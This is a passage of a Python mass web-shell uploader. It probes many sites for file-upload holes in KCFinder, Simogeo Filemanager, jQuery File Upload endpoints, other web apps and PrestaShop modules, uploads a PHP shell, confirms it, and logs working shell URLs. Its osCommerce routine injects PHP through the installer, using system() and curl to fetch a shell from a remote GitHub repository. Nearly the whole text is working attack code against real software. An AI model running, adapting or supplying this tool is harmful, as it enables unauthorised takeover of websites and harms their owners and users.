				print('[Others] {}{}{} ||{}KCFINDER 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def kcfinder3(self, url):

		try:

			data = {'qqfile':open (jd, 'rb')}
			p = (url+'/kcfinder/upload.php')
			c = (url+'/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php.jd')
			gkj = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def kcfinder31(self, url):

		try:

			data = {'qqfile':open (php7, 'rb')}
			p = (url+'/kcfinder/upload.php')
			c = (url+'/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php7')
			hjjb = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 3.1{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 3.1{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def kcfinder4(self, url):

		try:

			data = {'qqfile':open(php7, 'rb')}
			p = (url+'/assets/plugins/ckeditor/kcfinder/upload.php')
			c = (url+'/assets/plugins/ckeditor/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php7')
			ahgi = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 4{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 4{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def kcfinder41(self, url):

		try:

			data = {'qqfile':open (jd, 'rb')}
			p = (url+'/assets/plugins/ckeditor/kcfinder/upload.php')
			c = (url+'/assets/plugins/ckeditor/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php.jd')
			asdasd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 4.1{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 4.1{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def kcfinder5(self, url):

		try:

			data = {'qqfile':open (php7, 'rb')}
			p = (url+'/admin/ckeditor/kcfinder/upload.php')
			c = (url+'/admin/ckeditor/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php7')
			kjg = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 5{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 5{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def kcfinder51(self, url):

		try:

			data = {'qqfile':open (jd, 'rb')}
			p = (url+'/admin/ckeditor/kcfinder/upload.php')
			c = (url+'/admin/ckeditor/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php.jd')
			hasd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 5.1{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 5.1{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def kcfinder6(self, url):

		try:
			data = {'qqfile':open (php7, 'rb')}
			p = (url+'/libraries/jscripts/kcfinder/upload.php')
			c = (url+'/libraries/jscripts/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php7')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 6{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 6{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def kcfinder61(self, url):

		try:
			data = {'qqfile':open (jd, 'rb')}
			p = (url+'/libraries/jscripts/kcfinder/upload.php')
			c = (url+'/libraries/jscripts/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php.jd')
			jashd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 6.1{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 6.1{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def kcfinder7(self, url):

		try:
			data = {'qqfile':open (php7, 'rb')}
			p = (url+'/ckeditor/kcfinder/upload.php')
			c = (url+'/ckeditor/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php7')
			hafs = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 7{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 7{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def kcfinder71(self, url):

		try:

			data = {'qqfile':open (jd, 'rb')}
			p = (url+'/ckeditor/kcfinder/upload.php')
			c = (url+'/ckeditor/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php.jd')
			fdes = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 7.1{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 7.1{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def kcfinder8(self, url):

		try:

			data = {'qqfile':open (jd, 'rb')}
			p = (url+'/js/ckeditor/kcfinder/upload.php')
			c = (url+'/js/ckeditor/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php.jd')
			ad = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 8{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 8{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def kcfinder81(self, url):

		try:

			data = {'qqfile':open (php7, 'rb')}
			p = (url+'/js/ckeditor/kcfinder/upload.php')
			c = (url+'/js/ckeditor/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php7')
			asdas = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 8.1{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 8.1{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def kcfinder9(self, url):

		try:

			data = {'qqfile':open (jd, 'rb')}
			p = (url+'/scripts/jquery/kcfinder/upload.php')
			c = (url+'/scripts/jquery/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php.jd')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 9{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 9{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def kcfinder91(self, url):

		try:

			data = {'qqfile':open (php7, 'rb')}
			p = (url+'/scripts/jquery/kcfinder/upload.php')
			c = (url+'/scripts/jquery/kcfinder/upload/files/Uploader_By_Cloud7_Agath.php7')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 9.1{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 9.1{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def kcfinder10(self, url):

		try:

			data = {'qqfile':open (php7, 'rb')}
			p = (url+'/kcfinder-2.51/upload.php')
			c = (url+'/kcfinder-2.51/upload/files/Uploader_By_Cloud7_Agath.php7')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 10{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 10{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def kcfinder101(self, url):

		try:

			data = {'qqfile':open (jd, 'rb')}
			p = (url+'/kcfinder-2.51/upload.php')
			c = (url+'/kcfinder-2.51/upload/files/Uploader_By_Cloud7_Agath.php.jd')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 10.1{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 10.1{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass
	def kcfinder102(self, url):

		try:

			data = {'qqfile':open (jd, 'rb')}
			p = (url+'/upload.php')
			c = (url+'/upload/files/Uploader_By_Cloud7_Agath.php.jd')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 10.2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 10.2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass
	def kcfinder103(self, url):

		try:

			data = {'qqfile':open (php7, 'rb')}
			p = (url+'/upload.php')
			c = (url+'/upload/files/Uploader_By_Cloud7_Agath.php7')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KCFINDER 10.3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KCFINDER 10.3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def simogeo(self, url):
		# 

		try:

			payload = {'mode':'add', 'currentpath':'/Filemanager/userfiles/'}
			shell = {'newfile':open (php, 'rb')}
			p = (url+'/Filemanager/connectors/php/filemanager.php?config=filemanager.config.js')
			pp = (url+'/Filemanager/connectors/php/filemanager.php?mode=rename&old=%2FFilemanager%2Fuserfiles%2Fup.txt&new=....//Uploader_By_Cloud7_Agath.php&config=filemanager.config.js')
			c = (url+'/Filemanager/userfiles/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, data=payload, files=shell)
			get = requests.get(pp, headers=headers, timeout=9)
			get2 = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get2.content:
				print('[Others] {}{}{} ||{}Simogeo{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}Simogeo{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def osco(self, url):

		try:
			asd = requests.get(url+'/install/index.php')
			if 'Welcome to osCommerce' in asd.text.encode('utf-8') or asd.status_code == 200:
				pay = url+'/install/install.php?step=4'
				data = {'DIR_FS_DOCUMENT_ROOT': './'}
				shell = '\');'
				shell += 'system("curl https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath.php");'
				shell += '/*'
				data['DB_DATABASE'] = shell
				post = requests.post(pay, data=data)
				asd = requests.get(url+'/install/includes/OsComPayLoad.php')
				asdw = requests.get(url+'/install/includes/Uploader_By_Cloud7_Agath.php')
				if 'Uploader_By_Cloud7_Agath_' in asdw.content:
					print('[Others] {}{}{} ||{}osCommerce{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/Others_Shell.txt', 'a').write(url+'/install/includes/Uploader_By_Cloud7_Agath.php'+'\n')
				else:
					print('[Others] {}{}{} ||{}osCommerce{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

			else:
				print('[Others] {}{}{} ||{}osCommerce{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def array(self, url):

		try:

			data = {'files[]':open (php, 'rb')}
			p = (url+'/server/php/')
			c = (url+'/server/php/files/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}Array Files{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}Array Files{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def dfac(self, url):

		try:

			data = {'files[]':open (php, 'rb')}
			p = (url+'/adminside/server/php/')
			c = (url+'/images/block/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}Design Factory{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}Design Factory{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def vephoto(self, url):

		try:

			data = {'files[]':open (php, 'rb')}
			p = (url+'/vehiculo_photos/server/php/')
			c = (url+'/vehiculo_photos/server/php/files/Uploader_By_Cloud7_Agath.php')#Vehiculo Photos
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}Vehiculo Photos{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}Vehiculo Photos{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def tpl(self, url):

		try:

			data = {'files[]':open (php, 'rb')}
			p = (url+'/tpl/plugins/upload9.1.0/server/php/')
			c = (url+"/tpl/plugins/upload9.1.0/server/php/files/Uploader_By_Cloud7_Agath.php")
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}Tpl File Upload{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}Tpl File Upload{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def filecms(self, url):

		try:

			data = {'files[]':open (php, 'rb')}
			p = (url+'/public/upload_nhieuanh/server/php/_index.php')
			c = (url+'/public/upload_nhieuanh/server/php/files/Uploader_By_Cloud7_Agath.php')
			ads = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}FileCMS{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}FileCMS{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def keybase(self, url):

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/web/image/upload.php')
			c = (url+'/web/image/Images/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}KeyBase{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}KeyBase{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def andr(self, url):

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/AndroidFileUpload/fileUpload.php')
			c = (url+'/AndroidFileUpload/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Others] {}{}{} ||{}Android File Upload{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Others_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Others] {}{}{} ||{}Android File Upload{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

				################ Drupal ################

class PrestaShop:
	def columnad(self, url):
		# last

		try:

			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/columnadverts/uploadimage.php')
			c = (url+'/modules/columnadverts/slides/Uploader_By_Cloud7_Agath.php')
			posu = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Columnadverts{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Columnadverts{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass



	def columnad2(self, url):
		# gajadi last

		try:

			data = {'userfile':open (phtml, 'rb')}
			p = (url+'/modules/columnadverts2/uploadimage.php')
			c = (url+'/modules/columnadverts2/slides/Uploader_By_Cloud7_Agath.phtml')
			ads = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Columnadverts 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Columnadverts 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def homepagead(self, url):
		# need shell for seo!

		try:

			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/homepageadvertise/uploadimage.php')
			c = (url+'/modules/homepageadvertise/slides/Uploader_By_Cloud7_Agath.php')
			uill = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Homepageadvertise{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Homepageadvertise{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def homepagead2(self, url):
		# last!

		try:

			data = {'userfile':open (phtml, 'rb')}
			p = (url+'/modules/homepageadvertise2/uploadimage.php')
			c = (url+'/modules/homepageadvertise2/slides/Uploader_By_Cloud7_Agath.phtml')
			adas = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Homepageadvertise 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Homepageadvertise 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def propagead(self, url):
		# Need shell for seo :v no one this list not good for me! :v

		try:

			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/productpageadverts/uploadimage.php')
			c = (url+'/modules/productpageadverts/slides/Uploader_By_Cloud7_Agath.php')
			asdasd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Productpageadverts{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Productpageadverts{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def propagead2(self, url):
		# last

		try:

			data = {'userfile':open (phtml, 'rb')}
			p = (url+'/modules/productpageadverts2/uploadimage.php')
			c = (url+'/modules/productpageadverts2/slides/Uploader_By_Cloud7_Agath.phtml')
			dsa = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Productpageadverts 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Productpageadverts 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def simpleslide(self, url):
		# one

		try:

			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/simpleslideshow/uploadimage.php')
			c = (url+'/modules/simpleslideshow/slides/Uploader_By_Cloud7_Agath.php')
			adsdqw = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Simpleslideshow{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Simpleslideshow{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def simpleslide2(self, url):
		# last

		try:
			data = {'userfile':open (phtml, 'rb')}
			p = (url+'/modules/simpleslideshow/uploadimage.php')
			c = (url+'/modules/simpleslideshow/slides/Uploader_By_Cloud7_Agath.phtml')
			asdq2 = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Simpleslideshow 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Simpleslideshow 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def vtemslide(self, url):
		# one 

		try:
			data ={'userfile':open (phtml, 'rb')}
			p = (url+'/modules/vtemslideshow/uploadimage.php')
			c = (url+'/modules/vtemslideshow/slides/Uploader_By_Cloud7_Agath.phtml')
			oiwrq = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Vtemslideshow{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Vtemslideshow{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def realty(self, url):
		# last 

		try:
			data ={'userfile':open (php, 'rb')}
			p = (url+'/modules/realty/include/uploadimage.php')
			c = (url+'/modules/realty/include/slides/Uploader_By_Cloud7_Agath.php')
			po = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Realty{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Realty{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def realty2(self, url):
		# last2

		try:

			data = {'userfile':open (phtml, 'rb')}
			p = (url+'/modules/realty/include/uploadimage.php')
			c = (url+'/modules/realty/include/slides/Uploader_By_Cloud7_Agath.phtml')
			qwe = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Realty 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Realty 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def realty3(self, url):
		# last3

		try:
			data = {'userfile':open (phtml, 'rb')}
			p = (url+'/modules/realty/evogallery/uploadimage.php')
			c = (url+'/modules/realty/evogallery/slides/Uploader_By_Cloud7_Agath.phtml')
			ohi = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Realty 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Realty 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def realty4(self, url):
		# males

		try:
			data = {'userfile':open (phtml, 'rb')}
			p = (url+'/modules/realty/evogallery2/uploadimage.php')
			c = (url+'/modules/realty/evogallery2/slides/Uploader_By_Cloud7_Agath.phtml')
			kj = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Realty 4{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Realty 4{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass


	def premeg(self, url):
		# 

		try:
			data = {'userfile':open (phtml, 'rb')}
			p = (url+'/modules/megaproduct/')
			c = (url+'/modules/megaproduct/Uploader_By_Cloud7_Agath.phtml')
			oi = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Megaproduct{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Megaproduct{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

